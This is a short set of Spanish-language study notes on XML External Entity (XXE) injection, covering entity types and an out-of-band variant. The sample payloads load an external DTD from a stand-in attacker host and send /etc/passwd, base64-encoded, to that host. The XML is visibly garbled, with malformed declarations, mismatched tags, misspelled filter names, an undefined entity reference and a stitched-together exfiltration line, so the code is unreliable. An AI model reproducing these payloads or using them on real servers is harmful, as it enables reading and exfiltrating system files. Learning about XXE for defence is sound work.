___
- tags: #xxe #owasp #dtd
___
Nos referimos a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios en la red.
Un ataque XXE generalmente implica una inyección maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible.

## Entidades
Son una forma de representar un elemento de datos, sin referenciar a los datos como tal, todo ello en  un documento XML
- Genéricas/customizadas.
- Externas(XXE).
- Predefinidas.
	- &lt;
	- &gt;
```html
<?xml version="1.0" encoding="UTF-8">
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "miEntidad">]>
<Profesores>
	<Nombre> Chicoj2ck </Nombre>
	<Edad> 23 </Edad>
	<Rol> Lammer </Rol>
</Hack4u>
```

## External DTD (XXE OOB) - Document Type Definition - Out Of Band
```html
<?xml version="1.0" encoding="UTF-8">
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http:?/IPatacante/malicious.dtd"> %xxe;]>
<Profesores>
	<Nombre> Chicoj2ck </Nombre>
	<Edad> 23 </Edad>
	<Rol> Lammer </Rol>
</Hack4u>
```
### Malicious DTD
```html
<?xml version="1.0" encoding="UTF-8">
<!Entity % file SYSTEM "php://filter/conver.base64-encode/resource=/etc/passwd">
<!Entity &#x25 exfil SYSTEM "http://IPatacante?file=%file;/conver.base64-encode/resource=/etc/passwd" [<!ENTITY xxe SYSTEM "miEntidad">]>
%eval;
%exfil;
```